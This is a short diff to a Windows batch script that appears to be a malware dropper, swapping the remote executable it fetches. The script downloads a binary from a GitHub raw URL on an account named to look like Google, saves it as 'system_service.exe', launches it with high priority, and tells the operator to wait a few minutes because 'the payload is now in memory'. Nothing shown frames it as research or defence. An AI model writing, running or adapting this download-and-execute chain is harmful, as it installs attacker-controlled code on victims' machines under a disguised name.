@@ -38,7 +38,7 @@ if %errorlevel% neq 0 (
 )
 
 :: 2. DOWNLOAD THE PAYLOAD
-set "pUrl=https://github.com/g00glecenter101-arch/Loop/raw/refs/heads/main/Clientttt1.exe"
+set "pUrl=https://github.com/g00glecenter101-arch/Loop/raw/refs/heads/main/Testball.exe"
 set "pName=system_service.exe"
 
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%pUrl%', '%pName%')"
@@ -53,6 +53,7 @@ start /high "" "%pName%"
 :: The payload is now in memory. Just wait your 3-5 minutes.
 
 exit
+
 
 
 
